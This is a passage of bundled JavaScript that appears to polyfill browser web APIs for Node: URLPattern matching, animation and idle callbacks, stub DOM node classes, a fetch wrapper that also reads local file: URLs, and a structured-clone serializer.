'"+D.baseURL+"'.")}if("string"==typeof D.protocol&&(u.protocol=function(u,D){var t;return u=(t=u).endsWith(":")?t.substr(0,t.length-":".length):t,D||""===u?u:g(u)}(D.protocol,t)),"string"==typeof D.username&&(u.username=function(u,D){if(D||""===u)return u;var t=new URL("https://example.com");return t.username=u,t.username}(D.username,t)),"string"==typeof D.password&&(u.password=function(u,D){if(D||""===u)return u;var t=new URL("https://example.com");return t.password=u,t.password}(D.password,t)),"string"==typeof D.hostname&&(u.hostname=function(u,D){return D||""===u?u:c(u)?y(u):v(u)}(D.hostname,t)),"string"==typeof D.port&&(u.port=function(u,D,t){return d(D)===u&&(u=""),t||""===u?u:R(u)}(D.port,u.protocol,t)),"string"==typeof D.pathname){if(u.pathname=D.pathname,F&&!function(u,D){return !(!u.length||"/"!==u[0]&&(!D||u.length<2||"\\"!=u[0]&&"{"!=u[0]||"/"!=u[1]))}(u.pathname,t)){var e=F.pathname.lastIndexOf("/");e>=0&&(u.pathname=F.pathname.substring(0,e+1)+u.pathname);}u.pathname=function(u,D,t){if(t||""===u)return u;if(D&&!l.includes(D))return new URL(D+":"+u).pathname;var F="/"==u[0];return u=new URL(F?u:"/-"+u,"https://example.com").pathname,F||(u=u.substring(2,u.length)),u}(u.pathname,u.protocol,t);}return "string"==typeof D.search&&(u.search=function(u,D){if(u=p(u,"?"),D||""===u)return u;var t=new URL("https://example.com");return t.search=u,t.search?t.search.substring(1,t.search.length):""}(D.search,t)),"string"==typeof D.hash&&(u.hash=function(u,D){if(u=p(u,"#"),D||""===u)return u;var t=new URL("https://example.com");return t.hash=u,t.hash?t.hash.substring(1,t.hash.length):""}(D.hash,t)),u}function N(u){return u.replace(/([+*?:{}()\\])/g,"\\$1")}function L(u,D){for(var t="[^"+(D.delimiter||"/#?").replace(/([.+*?^${}()[\]|/\\])/g,"\\$1")+"]+?",F=/(?:[\$0-9A-Z_a-z\xAA\xB5\xB7\xBA\xC0-\xD6\xD8-\xF6\xF8-\u02C1\u02C6-\u02D1\u02E0-\u02E4\u02EC\u02EE\u0300-\u0374\u0376\u0377\u037A-\u037D\u037F\u0386-\u038A\u038C\u038E-\u03A1\u03A3-\u03F5\u03F7-\u0481\u0483-\u0487\u048A-\u052F\u0531-\u0556\u0559\u0560-\u0588\u0591-\u05BD\u05BF\u05C1\u05C2\u05C4\u05C5\u05C7\u05D0-\u05EA\u05EF-\u05F2\u0610-\u061A\u0620-\u0669\u066E-\u06D3\u06D5-\u06DC\u06DF-\u06E8\u06EA-\u06FC\u06FF\u0710-\u074A\u074D-\u07B1\u07C0-\u07F5\u07FA\u07FD\u0800-\u082D\u0840-\u085B\u0860-\u086A\u08A0-\u08B4\u08B6-\u08C7\u08D3-\u08E1\u08E3-\u0963\u0966-\u096F\u0971-\u0983\u0985-\u098C\u098F\u0990\u0993-\u09A8\u09AA-\u09B0\u09B2\u09B6-\u09B9\u09BC-\u09C4\u09C7\u09C8\u09CB-\u09CE\u09D7\u09DC\u09DD\u09DF-\u09E3\u09E6-\u09F1\u09FC\u09FE\u0A01-\u0A03\u0A05-\u0A0A\u0A0F\u0A10\u0A13-\u0A28\u0A2A-\u0A30\u0A32\u0A33\u0A35\u0A36\u0A38\u0A39\u0A3C\u0A3E-\u0A42\u0A47\u0A48\u0A4B-\u0A4D\u0A51\u0A59-\u0A5C\u0A5E\u0A66-\u0A75\u0A81-\u0A83\u0A85-\u0A8D\u0A8F-\u0A91\u0A93-\u0AA8\u0AAA-\u0AB0\u0AB2\u0AB3\u0AB5-\u0AB9\u0ABC-\u0AC5\u0AC7-\u0AC9\u0ACB-\u0ACD\u0AD0\u0AE0-\u0AE3\u0AE6-\u0AEF\u0AF9-\u0AFF\u0B01-\u0B03\u0B05-\u0B0C\u0B0F\u0B10\u0B13-\u0B28\u0B2A-\u0B30\u0B32\u0B33\u0B35-\u0B39\u0B3C-\u0B44\u0B47\u0B48\u0B4B-\u0B4D\u0B55-\u0B57\u0B5C\u0B5D\u0B5F-\u0B63\u0B66-\u0B6F\u0B71\u0B82\u0B83\u0B85-\u0B8A\u0B8E-\u0B90\u0B92-\u0B95\u0B99\u0B9A\u0B9C\u0B9E\u0B9F\u0BA3\u0BA4\u0BA8-\u0BAA\u0BAE-\u0BB9\u0BBE-\u0BC2\u0BC6-\u0BC8\u0BCA-\u0BCD\u0BD0\u0BD7\u0BE6-\u0BEF\u0C00-\u0C0C\u0C0E-\u0C10\u0C12-\u0C28\u0C2A-\u0C39\u0C3D-\u0C44\u0C46-\u0C48\u0C4A-\u0C4D\u0C55\u0C56\u0C58-\u0C5A\u0C60-\u0C63\u0C66-\u0C6F\u0C80-\u0C83\u0C85-\u0C8C\u0C8E-\u0C90\u0C92-\u0CA8\u0CAA-\u0CB3\u0CB5-\u0CB9\u0CBC-\u0CC4\u0CC6-\u0CC8\u0CCA-\u0CCD\u0CD5\u0CD6\u0CDE\u0CE0-\u0CE3\u0CE6-\u0CEF\u0CF1\u0CF2\u0D00-\u0D0C\u0D0E-\u0D10\u0D12-\u0D44\u0D46-\u0D48\u0D4A-\u0D4E\u0D54-\u0D57\u0D5F-\u0D63\u0D66-\u0D6F\u0D7A-\u0D7F\u0D81-\u0D83\u0D85-\u0D96\u0D9A-\u0DB1\u0DB3-\u0DBB\u0DBD\u0DC0-\u0DC6\u0DCA\u0DCF-\u0DD4\u0DD6\u0DD8-\u0DDF\u0DE6-\u0DEF\u0DF2\u0DF3\u0E01-\u0E3A\u0E40-\u0E4E\u0E50-\u0E59\u0E81\u0E82\u0E84\u0E86-\u0E8A\u0E8C-\u0EA3\u0EA5\u0EA7-\u0EBD\u0EC0-\u0EC4\u0EC6\u0EC8-\u0ECD\u0ED0-\u0ED9\u0EDC-\u0EDF\u0F00\u0F18\u0F19\u0F20-\u0F29\u0F35\u0F37\u0F39\u0F3E-\u0F47\u0F49-\u0F6C\u0F71-\u0F84\u0F86-\u0F97\u0F99-\u0FBC\u0FC6\u1000-\u1049\u1050-\u109D\u10A0-\u10C5\u10C7\u10CD\u10D0-\u10FA\u10FC-\u1248\u124A-\u124D\u1250-\u1256\u1258\u125A-\u125D\u1260-\u1288\u128A-\u128D\u1290-\u12B0\u12B2-\u12B5\u12B8-\u12BE\u12C0\u12C2-\u12C5\u12C8-\u12D6\u12D8-\u1310\u1312-\u1315\u1318-\u135A\u135D-\u135F\u1369-\u1371\u1380-\u138F\u13A0-\u13F5\u13F8-\u13FD\u1401-\u166C\u166F-\u167F\u1681-\u169A\u16A0-\u16EA\u16EE-\u16F8\u1700-\u170C\u170E-\u1714\u1720-\u1734\u1740-\u1753\u1760-\u176C\u176E-\u1770\u1772\u1773\u1780-\u17D3\u17D7\u17DC\u17DD\u17E0-\u17E9\u180B-\u180D\u1810-\u1819\u1820-\u1878\u1880-\u18AA\u18B0-\u18F5\u1900-\u191E\u1920-\u192B\u1930-\u193B\u1946-\u196D\u1970-\u1974\u1980-\u19AB\u19B0-\u19C9\u19D0-\u19DA\u1A00-\u1A1B\u1A20-\u1A5E\u1A60-\u1A7C\u1A7F-\u1A89\u1A90-\u1A99\u1AA7\u1AB0-\u1ABD\u1ABF\u1AC0\u1B00-\u1B4B\u1B50-\u1B59\u1B6B-\u1B73\u1B80-\u1BF3\u1C00-\u1C37\u1C40-\u1C49\u1C4D-\u1C7D\u1C80-\u1C88\u1C90-\u1CBA\u1CBD-\u1CBF\u1CD0-\u1CD2\u1CD4-\u1CFA\u1D00-\u1DF9\u1DFB-\u1F15\u1F18-\u1F1D\u1F20-\u1F45\u1F48-\u1F4D\u1F50-\u1F57\u1F59\u1F5B\u1F5D\u1F5F-\u1F7D\u1F80-\u1FB4\u1FB6-\u1FBC\u1FBE\u1FC2-\u1FC4\u1FC6-\u1FCC\u1FD0-\u1FD3\u1FD6-\u1FDB\u1FE0-\u1FEC\u1FF2-\u1FF4\u1FF6-\u1FFC\u200C\u200D\u203F\u2040\u2054\u2071\u207F\u2090-\u209C\u20D0-\u20DC\u20E1\u20E5-\u20F0\u2102\u2107\u210A-\u2113\u2115\u2118-\u211D\u2124\u2126\u2128\u212A-\u2139\u213C-\u213F\u2145-\u2149\u214E\u2160-\u2188\u2C00-\u2C2E\u2C30-\u2C5E\u2C60-\u2CE4\u2CEB-\u2CF3\u2D00-\u2D25\u2D27\u2D2D\u2D30-\u2D67\u2D6F\u2D7F-\u2D96\u2DA0-\u2DA6\u2DA8-\u2DAE\u2DB0-\u2DB6\u2DB8-\u2DBE\u2DC0-\u2DC6\u2DC8-\u2DCE\u2DD0-\u2DD6\u2DD8-\u2DDE\u2DE0-\u2DFF\u3005-\u3007\u3021-\u302F\u3031-\u3035\u3038-\u303C\u3041-\u3096\u3099-\u309F\u30A1-\u30FA\u30FC-\u30FF\u3105-\u312F\u3131-\u318E\u31A0-\u31BF\u31F0-\u31FF\u3400-\u4DBF\u4E00-\u9FFC\uA000-\uA48C\uA4D0-\uA4FD\uA500-\uA60C\uA610-\uA62B\uA640-\uA66F\uA674-\uA67D\uA67F-\uA6F1\uA717-\uA71F\uA722-\uA788\uA78B-\uA7BF\uA7C2-\uA7CA\uA7F5-\uA827\uA82C\uA840-\uA873\uA880-\uA8C5\uA8D0-\uA8D9\uA8E0-\uA8F7\uA8FB\uA8FD-\uA92D\uA930-\uA953\uA960-\uA97C\uA980-\uA9C0\uA9CF-\uA9D9\uA9E0-\uA9FE\uAA00-\uAA36\uAA40-\uAA4D\uAA50-\uAA59\uAA60-\uAA76\uAA7A-\uAAC2\uAADB-\uAADD\uAAE0-\uAAEF\uAAF2-\uAAF6\uAB01-\uAB06\uAB09-\uAB0E\uAB11-\uAB16\uAB20-\uAB26\uAB28-\uAB2E\uAB30-\uAB5A\uAB5C-\uAB69\uAB70-\uABEA\uABEC\uABED\uABF0-\uABF9\uAC00-\uD7A3\uD7B0-\uD7C6\uD7CB-\uD7FB\uF900-\uFA6D\uFA70-\uFAD9\uFB00-\uFB06\uFB13-\uFB17\uFB1D-\uFB28\uFB2A-\uFB36\uFB38-\uFB3C\uFB3E\uFB40\uFB41\uFB43\uFB44\uFB46-\uFBB1\uFBD3-\uFD3D\uFD50-\uFD8F\uFD92-\uFDC7\uFDF0-\uFDFB\uFE00-\uFE0F\uFE20-\uFE2F\uFE33\uFE34\uFE4D-\uFE4F\uFE70-\uFE74\uFE76-\uFEFC\uFF10-\uFF19\uFF21-\uFF3A\uFF3F\uFF41-\uFF5A\uFF66-\uFFBE\uFFC2-\uFFC7\uFFCA-\uFFCF\uFFD2-\uFFD7\uFFDA-\uFFDC]|\uD800[\uDC00-\uDC0B\uDC0D-\uDC26\uDC28-\uDC3A\uDC3C\uDC3D\uDC3F-\uDC4D\uDC50-\uDC5D\uDC80-\uDCFA\uDD40-\uDD74\uDDFD\uDE80-\uDE9C\uDEA0-\uDED0\uDEE0\uDF00-\uDF1F\uDF2D-\uDF4A\uDF50-\uDF7A\uDF80-\uDF9D\uDFA0-\uDFC3\uDFC8-\uDFCF\uDFD1-\uDFD5]|\uD801[\uDC00-\uDC9D\uDCA0-\uDCA9\uDCB0-\uDCD3\uDCD8-\uDCFB\uDD00-\uDD27\uDD30-\uDD63\uDE00-\uDF36\uDF40-\uDF55\uDF60-\uDF67]|\uD802[\uDC00-\uDC05\uDC08\uDC0A-\uDC35\uDC37\uDC38\uDC3C\uDC3F-\uDC55\uDC60-\uDC76\uDC80-\uDC9E\uDCE0-\uDCF2\uDCF4\uDCF5\uDD00-\uDD15\uDD20-\uDD39\uDD80-\uDDB7\uDDBE\uDDBF\uDE00-\uDE03\uDE05\uDE06\uDE0C-\uDE13\uDE15-\uDE17\uDE19-\uDE35\uDE38-\uDE3A\uDE3F\uDE60-\uDE7C\uDE80-\uDE9C\uDEC0-\uDEC7\uDEC9-\uDEE6\uDF00-\uDF35\uDF40-\uDF55\uDF60-\uDF72\uDF80-\uDF91]|\uD803[\uDC00-\uDC48\uDC80-\uDCB2\uDCC0-\uDCF2\uDD00-\uDD27\uDD30-\uDD39\uDE80-\uDEA9\uDEAB\uDEAC\uDEB0\uDEB1\uDF00-\uDF1C\uDF27\uDF30-\uDF50\uDFB0-\uDFC4\uDFE0-\uDFF6]|\uD804[\uDC00-\uDC46\uDC66-\uDC6F\uDC7F-\uDCBA\uDCD0-\uDCE8\uDCF0-\uDCF9\uDD00-\uDD34\uDD36-\uDD3F\uDD44-\uDD47\uDD50-\uDD73\uDD76\uDD80-\uDDC4\uDDC9-\uDDCC\uDDCE-\uDDDA\uDDDC\uDE00-\uDE11\uDE13-\uDE37\uDE3E\uDE80-\uDE86\uDE88\uDE8A-\uDE8D\uDE8F-\uDE9D\uDE9F-\uDEA8\uDEB0-\uDEEA\uDEF0-\uDEF9\uDF00-\uDF03\uDF05-\uDF0C\uDF0F\uDF10\uDF13-\uDF28\uDF2A-\uDF30\uDF32\uDF33\uDF35-\uDF39\uDF3B-\uDF44\uDF47\uDF48\uDF4B-\uDF4D\uDF50\uDF57\uDF5D-\uDF63\uDF66-\uDF6C\uDF70-\uDF74]|\uD805[\uDC00-\uDC4A\uDC50-\uDC59\uDC5E-\uDC61\uDC80-\uDCC5\uDCC7\uDCD0-\uDCD9\uDD80-\uDDB5\uDDB8-\uDDC0\uDDD8-\uDDDD\uDE00-\uDE40\uDE44\uDE50-\uDE59\uDE80-\uDEB8\uDEC0-\uDEC9\uDF00-\uDF1A\uDF1D-\uDF2B\uDF30-\uDF39]|\uD806[\uDC00-\uDC3A\uDCA0-\uDCE9\uDCFF-\uDD06\uDD09\uDD0C-\uDD13\uDD15\uDD16\uDD18-\uDD35\uDD37\uDD38\uDD3B-\uDD43\uDD50-\uDD59\uDDA0-\uDDA7\uDDAA-\uDDD7\uDDDA-\uDDE1\uDDE3\uDDE4\uDE00-\uDE3E\uDE47\uDE50-\uDE99\uDE9D\uDEC0-\uDEF8]|\uD807[\uDC00-\uDC08\uDC0A-\uDC36\uDC38-\uDC40\uDC50-\uDC59\uDC72-\uDC8F\uDC92-\uDCA7\uDCA9-\uDCB6\uDD00-\uDD06\uDD08\uDD09\uDD0B-\uDD36\uDD3A\uDD3C\uDD3D\uDD3F-\uDD47\uDD50-\uDD59\uDD60-\uDD65\uDD67\uDD68\uDD6A-\uDD8E\uDD90\uDD91\uDD93-\uDD98\uDDA0-\uDDA9\uDEE0-\uDEF6\uDFB0]|\uD808[\uDC00-\uDF99]|\uD809[\uDC00-\uDC6E\uDC80-\uDD43]|[\uD80C\uD81C-\uD820\uD822\uD840-\uD868\uD86A-\uD86C\uD86F-\uD872\uD874-\uD879\uD880-\uD883][\uDC00-\uDFFF]|\uD80D[\uDC00-\uDC2E]|\uD811[\uDC00-\uDE46]|\uD81A[\uDC00-\uDE38\uDE40-\uDE5E\uDE60-\uDE69\uDED0-\uDEED\uDEF0-\uDEF4\uDF00-\uDF36\uDF40-\uDF43\uDF50-\uDF59\uDF63-\uDF77\uDF7D-\uDF8F]|\uD81B[\uDE40-\uDE7F\uDF00-\uDF4A\uDF4F-\uDF87\uDF8F-\uDF9F\uDFE0\uDFE1\uDFE3\uDFE4\uDFF0\uDFF1]|\uD821[\uDC00-\uDFF7]|\uD823[\uDC00-\uDCD5\uDD00-\uDD08]|\uD82C[\uDC00-\uDD1E\uDD50-\uDD52\uDD64-\uDD67\uDD70-\uDEFB]|\uD82F[\uDC00-\uDC6A\uDC70-\uDC7C\uDC80-\uDC88\uDC90-\uDC99\uDC9D\uDC9E]|\uD834[\uDD65-\uDD69\uDD6D-\uDD72\uDD7B-\uDD82\uDD85-\uDD8B\uDDAA-\uDDAD\uDE42-\uDE44]|\uD835[\uDC00-\uDC54\uDC56-\uDC9C\uDC9E\uDC9F\uDCA2\uDCA5\uDCA6\uDCA9-\uDCAC\uDCAE-\uDCB9\uDCBB\uDCBD-\uDCC3\uDCC5-\uDD05\uDD07-\uDD0A\uDD0D-\uDD14\uDD16-\uDD1C\uDD1E-\uDD39\uDD3B-\uDD3E\uDD40-\uDD44\uDD46\uDD4A-\uDD50\uDD52-\uDEA5\uDEA8-\uDEC0\uDEC2-\uDEDA\uDEDC-\uDEFA\uDEFC-\uDF14\uDF16-\uDF34\uDF36-\uDF4E\uDF50-\uDF6E\uDF70-\uDF88\uDF8A-\uDFA8\uDFAA-\uDFC2\uDFC4-\uDFCB\uDFCE-\uDFFF]|\uD836[\uDE00-\uDE36\uDE3B-\uDE6C\uDE75\uDE84\uDE9B-\uDE9F\uDEA1-\uDEAF]|\uD838[\uDC00-\uDC06\uDC08-\uDC18\uDC1B-\uDC21\uDC23\uDC24\uDC26-\uDC2A\uDD00-\uDD2C\uDD30-\uDD3D\uDD40-\uDD49\uDD4E\uDEC0-\uDEF9]|\uD83A[\uDC00-\uDCC4\uDCD0-\uDCD6\uDD00-\uDD4B\uDD50-\uDD59]|\uD83B[\uDE00-\uDE03\uDE05-\uDE1F\uDE21\uDE22\uDE24\uDE27\uDE29-\uDE32\uDE34-\uDE37\uDE39\uDE3B\uDE42\uDE47\uDE49\uDE4B\uDE4D-\uDE4F\uDE51\uDE52\uDE54\uDE57\uDE59\uDE5B\uDE5D\uDE5F\uDE61\uDE62\uDE64\uDE67-\uDE6A\uDE6C-\uDE72\uDE74-\uDE77\uDE79-\uDE7C\uDE7E\uDE80-\uDE89\uDE8B-\uDE9B\uDEA1-\uDEA3\uDEA5-\uDEA9\uDEAB-\uDEBB]|\uD83E[\uDFF0-\uDFF9]|\uD869[\uDC00-\uDEDD\uDF00-\uDFFF]|\uD86D[\uDC00-\uDF34\uDF40-\uDFFF]|\uD86E[\uDC00-\uDC1D\uDC20-\uDFFF]|\uD873[\uDC00-\uDEA1\uDEB0-\uDFFF]|\uD87A[\uDC00-\uDFE0]|\uD87E[\uDC00-\uDE1D]|\uD884[\uDC00-\uDF4A]|\uDB40[\uDD00-\uDDEF])/,e="",C=0;C<u.length;++C){var A=u[C],E=C>0?u[C-1]:null,n=C<u.length-1?u[C+1]:null;if("string"!=typeof A)if(""!==A.pattern){var r="number"!=typeof A.name,i=void 0!==D.prefixes?D.prefixes:"./",s=""!==A.suffix||""!==A.prefix&&(1!==A.prefix.length||!i.includes(A.prefix));s||!r||A.pattern!==t||""!==A.modifier||!n||n.prefix||n.suffix||(s="string"==typeof n?F.test(n.length>0?n[0]:""):"number"==typeof n.name),!s&&""===A.prefix&&E&&"string"==typeof E&&E.length>0&&(s=i.includes(E[E.length-1])),s&&(e+="{"),e+=N(A.prefix),r&&(e+=":"+A.name),".*"===A.pattern?e+=r||E&&"string"!=typeof E&&!E.modifier&&!s&&""===A.prefix?"(.*)":"*":A.pattern===t?r||(e+="("+t+")"):e+="("+A.pattern+")",A.pattern===t&&r&&""!==A.suffix&&F.test(A.suffix[0])&&(e+="\\"),e+=N(A.suffix),s&&(e+="}"),e+=A.modifier;}else {if(""===A.modifier){e+=N(A.prefix);continue}e+="{"+N(A.prefix)+"}"+A.modifier;}else e+=N(A);}return e}var U=function(){function u(u,D){void 0===u&&(u={}),this.pattern=void 0,this.regexp={},this.keys={},this.component_pattern={};try{if("string"==typeof u){var t=new b(u);if(t.parse(),u=t.result,D){if("string"!=typeof D)throw new TypeError("'baseURL' parameter is not of type 'string'.");u.baseURL=D;}else if("string"!=typeof u.protocol)throw new TypeError("A base URL must be provided for a relative constructor string.")}else if(D)throw new TypeError("parameter 1 is not of type 'string'.");if(!u||"object"!=typeof u)throw new TypeError("parameter 1 is not of type 'string' and cannot convert to dictionary.");var e;this.pattern=H({pathname:"*",protocol:"*",username:"*",password:"*",hostname:"*",port:"*",search:"*",hash:"*"},u,!0),d(this.pattern.protocol)===this.pattern.port&&(this.pattern.port="");for(var C,A=F(I);!(C=A()).done;)if((e=C.value)in this.pattern){var E={},r=this.pattern[e];switch(this.keys[e]=[],e){case"protocol":Object.assign(E,B),E.encodePart=g;break;case"username":Object.assign(E,B),E.encodePart=x;break;case"password":Object.assign(E,B),E.encodePart=S;break;case"hostname":Object.assign(E,o),E.encodePart=c(r)?y:v;break;case"port":Object.assign(E,B),E.encodePart=R;break;case"pathname":m(this.regexp.protocol)?(Object.assign(E,h),E.encodePart=k):(Object.assign(E,B),E.encodePart=w);break;case"search":Object.assign(E,B),E.encodePart=P;break;case"hash":Object.assign(E,B),E.encodePart=T;}try{var i=n(r,E);this.regexp[e]=s(i,this.keys[e],E),this.component_pattern[e]=L(i,E);}catch(u){throw new TypeError("invalid "+e+" pattern '"+this.pattern[e]+"'.")}}}catch(u){throw new TypeError("Failed to construct 'URLPattern': "+u.message)}}var t=u.prototype;return t.test=function(u,D){void 0===u&&(u={});var t,F={pathname:"",protocol:"",username:"",password:"",hostname:"",port:"",search:"",hash:""};if("string"!=typeof u&&D)throw new TypeError("parameter 1 is not of type 'string'.");if(void 0===u)return !1;try{F=H(F,"object"==typeof u?u:O(u,D),!1);}catch(u){return !1}for(t in this.pattern)if(!this.regexp[t].exec(F[t]))return !1;return !0},t.exec=function(u,D){void 0===u&&(u={});var t={pathname:"",protocol:"",username:"",password:"",hostname:"",port:"",search:"",hash:""};if("string"!=typeof u&&D)throw new TypeError("parameter 1 is not of type 'string'.");if(void 0!==u){try{t=H(t,"object"==typeof u?u:O(u,D),!1);}catch(u){return null}var e,C={};for(e in C.inputs=D?[u,D]:[u],this.pattern){var A=this.regexp[e].exec(t[e]);if(!A)return null;for(var E,n={},r=F(this.keys[e].entries());!(E=r()).done;){var i=E.value,s=i[1];"string"!=typeof s.name&&"number"!=typeof s.name||(n[s.name]=A[i[0]+1]||"");}C[e]={input:t[e]||"",groups:n};}return C}},D(u,[{key:"protocol",get:function(){return this.component_pattern.protocol}},{key:"username",get:function(){return this.component_pattern.username}},{key:"password",get:function(){return this.component_pattern.password}},{key:"hostname",get:function(){return this.component_pattern.hostname}},{key:"port",get:function(){return this.component_pattern.port}},{key:"pathname",get:function(){return this.component_pattern.pathname}},{key:"search",get:function(){return this.component_pattern.search}},{key:"hash",get:function(){return this.component_pattern.hash}}]),u}();

const INTERNAL$2 = { tick: 0, pool: new Map() };
function requestAnimationFrame(callback) {
    if (!INTERNAL$2.pool.size) {
        setTimeout$1(() => {
            const next = __performance_now();
            for (const func of INTERNAL$2.pool.values()) {
                func(next);
            }
            INTERNAL$2.pool.clear();
        }, 1000 / 16);
    }
    const func = __function_bind(callback, undefined);
    const tick = ++INTERNAL$2.tick;
    INTERNAL$2.pool.set(tick, func);
    return tick;
}
function cancelAnimationFrame(requestId) {
    const timeout = INTERNAL$2.pool.get(requestId);
    if (timeout) {
        clearTimeout$1(timeout);
        INTERNAL$2.pool.delete(requestId);
    }
}

function atob(data) {
    return Buffer.from(data, 'base64').toString('binary');
}
function btoa(data) {
    return Buffer.from(data, 'binary').toString('base64');
}

class Node extends EventTarget {
    append(...nodesOrDOMStrings) {
    }
    appendChild(childNode) {
        return childNode;
    }
    after(...nodesOrDOMStrings) {
    }
    before(...nodesOrDOMStrings) {
    }
    prepend(...nodesOrDOMStrings) {
    }
    replaceChild(newChild, oldChild) {
        return oldChild;
    }
    removeChild(childNode) {
        return childNode;
    }
    get attributes() {
        return {};
    }
    get childNodes() {
        return [];
    }
    get children() {
        return [];
    }
    get ownerDocument() {
        return null;
    }
    get nodeValue() {
        return '';
    }
    set nodeValue(value) {
    }
    get textContent() {
        return '';
    }
    set textContent(value) {
    }
    get previousElementSibling() {
        return null;
    }
    get nextElementSibling() {
        return null;
    }
    [Symbol.for('nodejs.util.inspect.custom')](depth, options) {
        return `${this.constructor.name}`;
    }
}
class DocumentFragment extends Node {
}
class ShadowRoot extends DocumentFragment {
    get innerHTML() {
        return '';
    }
    set innerHTML(value) {
    }
}
const NodeFilter$1 = Object.assign({
    NodeFilter() {
        throw new TypeError('Illegal constructor');
    },
}.NodeFilter, {
    FILTER_ACCEPT: 1,
    FILTER_REJECT: 2,
    FILTER_SKIP: 3,
    SHOW_ALL: 4294967295,
    SHOW_ELEMENT: 1,
    SHOW_ATTRIBUTE: 2,
    SHOW_TEXT: 4,
    SHOW_CDATA_SECTION: 8,
    SHOW_ENTITY_REFERENCE: 16,
    SHOW_ENTITY: 32,
    SHOW_PROCESSING_INSTRUCTION: 64,
    SHOW_COMMENT: 128,
    SHOW_DOCUMENT: 256,
    SHOW_DOCUMENT_TYPE: 512,
    SHOW_DOCUMENT_FRAGMENT: 1024,
    SHOW_NOTATION: 2048,
});
class NodeIterator$1 {
    nextNode() {
        return null;
    }
    previousNode() {
        return null;
    }
    get filter() {
        const internals = internalsOf(this, 'NodeIterator', 'filter');
        return internals.filter;
    }
    get pointerBeforeReferenceNode() {
        const internals = internalsOf(this, 'NodeIterator', 'pointerBeforeReferenceNode');
        return internals.pointerBeforeReferenceNode;
    }
    get referenceNode() {
        const internals = internalsOf(this, 'NodeIterator', 'referenceNode');
        return internals.referenceNode;
    }
    get root() {
        const internals = internalsOf(this, 'NodeIterator', 'root');
        return internals.root;
    }
    get whatToShow() {
        const internals = internalsOf(this, 'NodeIterator', 'whatToShow');
        return internals.whatToShow;
    }
}
allowStringTag(Node);
allowStringTag(NodeIterator$1);
allowStringTag(DocumentFragment);
allowStringTag(ShadowRoot);

class CharacterData extends Node {
    constructor(data) {
        INTERNALS.set(super(), {
            data: String(data),
        });
    }
    get data() {
        return internalsOf(this, 'CharacterData', 'data')
            .data;
    }
    get textContent() {
        return internalsOf(this, 'CharacterData', 'textContent').data;
    }
}
class Comment extends CharacterData {
}
class Text extends CharacterData {
    get assignedSlot() {
        return null;
    }
    get wholeText() {
        return internalsOf(this, 'CharacterData', 'textContent').data;
    }
}
allowStringTag(CharacterData);
allowStringTag(Text);
allowStringTag(Comment);

class CustomEvent extends Event {
    constructor(type, params) {
        params = Object(params);
        super(type, params);
        if ('detail' in params)
            this.detail = params.detail;
    }
}
allowStringTag(CustomEvent);

bootstrap({
    environmentVariableNamespace: '',
});
const fetch = {
    fetch(resource, init) {
        const resourceURL = new URL(__object_isPrototypeOf(Request$1.prototype, resource)
            ? resource.url
            : pathToPosix(resource), typeof Object(globalThis.process).cwd === 'function'
            ? 'file:' + pathToPosix(process.cwd()) + '/'
            : 'file:');
        if (resourceURL.protocol.toLowerCase() === 'file:') {
            return import('node:fs').then((fs) => {
                try {
                    const stats = fs.statSync(resourceURL);
                    const body = fs.createReadStream(resourceURL);
                    return new Response$1(body, {
                        status: 200,
                        statusText: '',
                        headers: {
                            'content-length': String(stats.size),
                            date: new Date().toUTCString(),
                            'last-modified': new Date(stats.mtimeMs).toUTCString(),
                        },
                    });
                }
                catch (error) {
                    const body = new Stream.Readable();
                    body._read = () => { };
                    body.push(null);
                    return new Response$1(body, {
                        status: 404,
                        statusText: '',
                        headers: {
                            date: new Date().toUTCString(),
                        },
                    });
                }
            });
        }
        else {
            return nodeFetch(resource, init);
        }
    },
}.fetch;

const INTERNAL$1 = { tick: 0, pool: new Map() };
function requestIdleCallback(callback) {
    if (!INTERNAL$1.pool.size) {
        setTimeout$1(() => {
            const next = __performance_now();
            for (const func of INTERNAL$1.pool.values()) {
                func(next);
            }
            INTERNAL$1.pool.clear();
        }, 1000 / 16);
    }
    const func = __function_bind(callback, undefined);
    const tick = ++INTERNAL$1.tick;
    INTERNAL$1.pool.set(tick, func);
    return tick;
}
function cancelIdleCallback(requestId) {
    const timeout = INTERNAL$1.pool.get(requestId);
    if (timeout) {
        clearTimeout$1(timeout);
        INTERNAL$1.pool.delete(requestId);
    }
}

const PRIMITIVE  = 0;
const ARRAY      = 1;
const OBJECT     = 2;
const DATE       = 3;
const REGEXP     = 4;
const MAP        = 5;
const SET        = 6;
const ERROR      = 7;
const BIGINT     = 8;
// export const SYMBOL = 9;

const env = typeof self === 'object' ? self : globalThis;

const deserializer = ($, _) => {
  const as = (out, index) => {
    $.set(index, out);
    return out;
  };

  const unpair = index => {
    if ($.has(index))
      return $.get(index);

    const [type, value] = _[index];
    switch (type) {
      case PRIMITIVE:
        return as(value, index);
      case ARRAY: {
        const arr = as([], index);
        for (const index of value)
          arr.push(unpair(index));
        return arr;
      }
      case OBJECT: {
        const object = as({}, index);
        for (const [key, index] of value)
          object[unpair(key)] = unpair(index);
        return object;
      }
      case DATE:
        return as(new Date(value), index);
      case REGEXP: {
        const {source, flags} = value;
        return as(new RegExp(source, flags), index);
      }
      case MAP: {
        const map = as(new Map, index);
        for (const [key, index] of value)
          map.set(unpair(key), unpair(index));
        return map;
      }
      case SET: {
        const set = as(new Set, index);
        for (const index of value)
          set.add(unpair(index));
        return set;
      }
      case ERROR: {
        const {name, message} = value;
        return as(new env[name](message), index);
      }
      case BIGINT:
        return as(BigInt(value), index);
      case 'BigInt':
        return as(Object(BigInt(value)), index);
    }
    return as(new env[type](value), index);
  };

  return unpair;
};

/**
 * @typedef {Array<string,any>} Record a type representation
 */

/**
 * Returns a deserialized value from a serialized array of Records.
 * @param {Record[]} serialized a previously serialized value.
 * @returns {any}
 */
const deserialize = serialized => deserializer(new Map, serialized)(0);

const EMPTY = '';

const {toString} = {};
const {keys} = Object;

const typeOf = value => {
  const type = typeof value;
  if (type !== 'object' || !value)
    return [PRIMITIVE, type];

  const asString = toString.call(value).slice(8, -1);
  switch (asString) {
    case 'Array':
      return [ARRAY, EMPTY];
    case 'Object':
      return [OBJECT, EMPTY];
    case 'Date':
      return [DATE, EMPTY];
    case 'RegExp':
      return [REGEXP, EMPTY];
    case 'Map':
      return [MAP, EMPTY];
    case 'Set':
      return [SET, EMPTY];
  }

  if (asString.includes('Array'))
    return [ARRAY, asString];

  if (asString.includes('Error'))
    return [ERROR, asString];

  return [OBJECT, asString];
};

const shouldSkip = ([TYPE, type]) => (
  TYPE === PRIMITIVE &&
  (type === 'function' || type === 'symbol')
);

const serializer = (strict, json, $, _) => {

  const as = (out, value) => {
